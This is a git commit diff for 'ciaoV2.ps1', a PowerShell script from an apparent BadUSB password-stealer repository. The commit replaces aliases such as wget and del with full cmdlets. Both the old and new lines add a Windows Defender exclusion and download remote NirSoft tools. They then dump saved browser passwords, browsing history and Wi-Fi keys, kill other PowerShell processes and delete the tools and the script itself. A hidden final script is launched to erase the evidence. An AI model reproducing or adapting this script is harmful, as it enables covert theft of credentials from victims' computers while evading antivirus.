14da4cb11afa1b48972a73edd6caf775c6e32c0f
tuconnaisyouknow <yenghele@fayou.cloud>
2022-03-29 19:13:52 +0200

    Update ciaoV2.ps1

--- ciaoV2.ps1
+++ ciaoV2.ps1
@@ -1,10 +1,10 @@
-cd C:\Users\Public\Documents #Go to the folder in which we will download files
+Set-Location C:\Users\Public\Documents #Go to the folder in which we will donwload files
 Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
-wget https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/fin.ps1 -OutFile fin.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
-wget https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
-wget https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe #Download the nirsoft tool for connected devces
-wget https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe #Download the nirsoft tool for WiFi passwords
-wget https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
+Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/fin.ps1 -OutFile fin.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe #Download the nirsoft tool for connected devces
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe #Download the nirsoft tool for WiFi passwords
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
 .\WebBrowserPassView.exe /stext passwords.txt #Create the file for Browser passwords
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt #Create the file for Browser history
 .\WirelessKeyView.exe /stext wifi.txt #Create the file for WiFi passwords
@@ -29,12 +29,12 @@ Start-Sleep -Seconds 15 #Wait 15 seconds
 Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
 Start-Sleep -Seconds 30 #Wait 30 seconds
 #Delete nirsoft tools and .ps1 file
-del BrowsingHistoryView.exe
-del WNetWatcher.exe
-del WNetWatcher.cfg
-del WirelessKeyView.exe
-del WebBrowserPassView.exe
-del ciaoV2.ps1
+Remove-Item BrowsingHistoryView.exe
+Remove-Item WNetWatcher.exe
+Remove-Item WNetWatcher.cfg
+Remove-Item WirelessKeyView.exe
+Remove-Item WebBrowserPassView.exe
+Remove-Item ciaoV2.ps1
 Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
 Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
 powershell.exe -noexit -windowstyle hidden -file fin.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
